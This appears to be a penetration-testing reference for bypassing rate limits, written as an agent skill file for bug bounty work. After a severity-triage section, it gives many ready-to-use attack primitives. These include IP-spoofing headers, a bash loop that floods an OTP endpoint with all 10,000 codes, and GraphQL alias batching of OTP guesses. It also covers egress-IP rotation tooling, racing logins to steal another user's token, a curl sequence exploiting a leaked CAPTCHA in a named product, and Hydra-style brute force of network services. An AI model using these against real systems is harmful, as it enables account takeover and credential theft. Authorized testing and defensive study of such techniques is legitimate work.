# Rate Limit Bypass Techniques

## Real Impact Gate — Answer Before Reporting

**IMPORTANT: Rate limit absence is NOT a standalone high-severity finding by default.** The severity depends entirely on what the unlimited requests enable.

Before reporting any rate limit finding, answer:
1. **What does the missing rate limit enable?**
   - Login brute force WITHOUT account lockout: High (credential brute force is viable)
   - OTP brute force without rate limit: High (MFA bypass is viable)
   - Password reset token brute force: High (account takeover chain)
   - API endpoint without rate limit that returns sensitive data per request: Medium
   - Non-sensitive API endpoint without rate limit: Low/Informational
   - Email sending endpoint without rate limit (spam): Low/Medium

2. **Is account lockout present as a compensating control?**
   - If account lockout exists after N failed attempts: rate limit absence is much less severe (Low only)
   - If NO lockout AND no rate limit: High (brute force is fully viable)

3. **Must demonstrate actual exploitation viability:**
   - For login: demonstrate sending 1000 password attempts and getting different responses (not all blocked)
   - For OTP: demonstrate trying multiple OTP values without being blocked
   - Generic "rate limiting is missing on /api/x" without demonstrated attack viability: Informational only

**Severity Classification:**
- No rate limit + no lockout on login/OTP/reset → High (brute force viable)
- No rate limit + account lockout on login → Low/Informational (lockout mitigates brute force risk)
- No rate limit on non-auth sensitive endpoint → Medium
- No rate limit on non-sensitive endpoint → Informational only

## Overview
Techniques to bypass rate limiting controls on APIs, login endpoints, OTP validation, and other protected resources. Only report rate limit findings where the bypass enables a meaningful attack.

## IP Rotation Headers
```
# Spoof source IP to bypass per-IP rate limits
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 1.2.3.4, 5.6.7.8
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
Forwarded: for=1.2.3.4

# Cycle through IPs in each request
X-Forwarded-For: 1.1.1.{{1-255}}
```

## Request Manipulation
```
# Add null byte or space to vary request
username=admin%00
username=admin 
username= admin

# Case variations
username=ADMIN vs admin vs Admin

# Add padding parameters (ignored by server)
?foo=bar&foo=baz
?_=1234567890 (cache buster)
?v=1, ?v=2, ?v=3...

# Change Content-Type
application/json → application/x-www-form-urlencoded
multipart/form-data

# Add/remove trailing slash
/api/login vs /api/login/
```

## Header Variations
```
# User-Agent rotation
User-Agent: Mozilla/5.0 ...
User-Agent: PostmanRuntime/7.x
User-Agent: python-requests/2.x

# Accept-Language variation
Accept-Language: en-US
Accept-Language: fr-FR

# Origin/Referer variation
Origin: https://target.com
Referer: https://target.com/login
```

## Session/Cookie Tricks
```
# Use different session cookies per request
# Delete and re-create session
# Use incognito/different browsers
# Clear cookies between requests

# Cookie manipulation
session=abc → session=xyz (enumerate)
```

## Endpoint Variations
```
# Try alternate endpoints
/api/v1/login
/api/v2/login
/api/login
/login
/auth/login
/account/login

# Different HTTP methods
POST /login → PUT /login → PATCH /login
```

## Time-Based Bypass
```
# Slow requests to avoid time-window limits
# Wait for rate limit window reset
# Distributed timing attacks
```

## OTP/PIN Brute Force Specific
```
# 4-digit OTP: only 10000 combinations
# If rate limit is per-session, create new sessions
# Check if OTP is validated server-side per attempt
# Look for race condition: send multiple OTPs simultaneously
# Check if old OTPs remain valid

# Async flood: send 10+ simultaneous requests with different OTPs
for i in {0000..9999}; do
  curl -s -X POST /verify-otp -d "otp=$i" &
done
```

## Password Reset Rate Limit
```
# Send reset emails to different addresses but same account
# Vary email case: Admin@target.com vs admin@target.com
# Use email aliases: admin+1@target.com, admin+2@target.com

# If link-based: try to enumerate token pattern
# If code-based: brute force with IP rotation
```

## API Rate Limit
```
# Use API key rotation if multiple keys available
# Test authenticated vs unauthenticated limits
# Check if rate limit applies to GET vs POST differently
# GraphQL: batch multiple operations in one request
```

## Testing Methodology
1. Identify rate-limited endpoint (login, OTP, password reset, API)
2. Determine rate limit type: per-IP, per-session, per-account, per-endpoint
3. Test IP header spoofing
4. Test request variation techniques
5. Test endpoint variations
6. Check for race conditions on the limit itself
7. Document bypass method and impact (OTP brute force = account takeover)

## Impact
- OTP bypass → account takeover
- Login brute force → credential stuffing
- Password reset abuse → spam/DoS
- API abuse → data harvesting, cost increase


## Additional Techniques — ported from WebSkills (writeup-techniques/brute-force)

The core file covers header-spoof, request/endpoint variation, session tricks, OTP brute, and the impact gate. The items below are attack-primitive and tooling techniques from the accepted-writeup corpus that are not otherwise represented.

### Disposable-egress-IP rotation infra (defeat *real* source-IP throttles)
Header spoofing only works when the limiter trusts a client header. When it keys on the true TCP source IP, rotate the actual egress:
```
fireprox                    # spins up disposable AWS API Gateway endpoints; every request egresses from a fresh IP
Burp IPRotate+ (extension)  # transparently rotates source IP through AWS API Gateway / proxy pool in Intruder/Turbo Intruder
IP-Rotator                  # same primitive; commonly paired with reset-token brute-force to beat per-IP throttle
```
Also seen: put the *guessed value itself* in `X-Forwarded-For` so every attempt presents a unique "IP" and the counter never trips (Bludit CVE-2019-17240 exploit puts each candidate password in XFF). Extra headers to try beyond the core list: `X-Remote-Addr`, `X-Host`, `X-Forwarded-Host`, `X-Custom-IP-Authorization: 127.0.0.1`.

### HTTP/2 single-packet / multiplexing to collapse the request count
Per-connection or request-count throttles fall to HTTP/2 multiplexing — many attempts ride one connection the limiter counts once:
```
Turbo Intruder (HTTP/2)  → concurrency 100–1000, collapses hundreds of requests into a single connection
HTTP/2 single-packet attack (PortSwigger "HTTP/2: The Sequel is Always Worse") → beats per-connection limits and races the attempt-counter
```

### GraphQL aliasing — thousands of guesses in ONE counted request
When the target exposes a GraphQL mutation for verify/login, alias the same mutation N times in a single HTTP request; the rate limiter counts one request (PortSwigger "Bypassing rate limits with GraphQL aliasing"):
```graphql
mutation {
  a: verifyOtp(code:"0000"){ ok }
  b: verifyOtp(code:"0001"){ ok }
  c: verifyOtp(code:"0002"){ ok }
  # ... thousands of aliases → limiter counts this as a single request
}
```

### Race on login → steal + plant the victim's token → ATO
Beyond racing the attempt-counter: fire many login requests with random creds so a request-handling race lets you capture a *legitimate* user's issued token when they log in, then plant it. OpenNebula pattern — steal the victim JWT during the race and set it client-side:
```
Application → Storage → Local Storage → FireedgeToken → replace with stolen token → refresh → full access
```

### Decoy requests to poison the rate-limit heuristic
Interleave dummy/benign requests among the real brute attempts so a heuristic limiter mis-classifies the pattern and the real guesses slip under the threshold (HackTricks 2FA "Decoy Requests").

### "Silent" rate limit — always send the correct value under the block
Even when a limiter *appears* active (429s, lockout banner), keep submitting the correct credential/OTP anyway and diff the response — the "limit" is often cosmetic and the valid value still returns success. One documented case: after 20 failures the server returned `401` for wrong OTPs but still returned `200` for the valid one. Detection: send the known-good value while "blocked" and compare status/length/body.

### CAPTCHA answer leaked in the response (read-and-replay)
Some CAPTCHA/verify endpoints return the secret they are supposed to validate. Request the code object, read it, replay it — no solving needed (iDS6 DSSPro `autoLoginVerifyCode`, EDB-48991):
```
$ curl -i 'http://target/Pages/login!autoLoginVerifyCode' -c cookies.txt
{"success":true,"message":"6435","data":"6435"}        # CAPTCHA answer echoed in JSON
$ curl -i 'http://target/Pages/login!userValidate' -b cookies.txt \
    -d "user.userName=boss&user.password=boss&loginVerifyCode=6435..."
{"success":true}
```
Generalize: diff every verify/reset/redirect/email-preview/JS response for the secret it echoes.

### Predictable / brute-forceable reset token — generation-scheme analysis
When a reset link/code is guessable, reverse the generation scheme and predict rather than brute:
```
Token derived from: Timestamp | UserID | email | Firstname+Lastname | DoB | weak crypto
UUIDv1 → predictable  → guidtool
Collect many tokens   → Burp Sequencer (entropy analysis)
```
Also: **use your own valid token with the victim's email** (token not bound to the initiating user); replay an **expired token** (often still accepted); brute the token with IP-Rotator to beat the per-IP throttle.

### Non-web / network-service brute tooling
The corpus extends past HTTP auth — same throttle-absence bugs on network services and default creds:
```
Hydra / Medusa / ncrack          # RDP, SMB, LDAP, FTP, VNC, SSH brute
WPS 8-digit PIN                  # only ~11,000 combinations
DefaultCreds-cheat-sheet / SecLists default-passwords.csv   # default creds first
crunch / CUPP / Wister / CeWL    # targeted dictionary from OSINT
```
Precede with a **user-enumeration oracle** (login/response differential, PII leak) to narrow the username list before spraying.
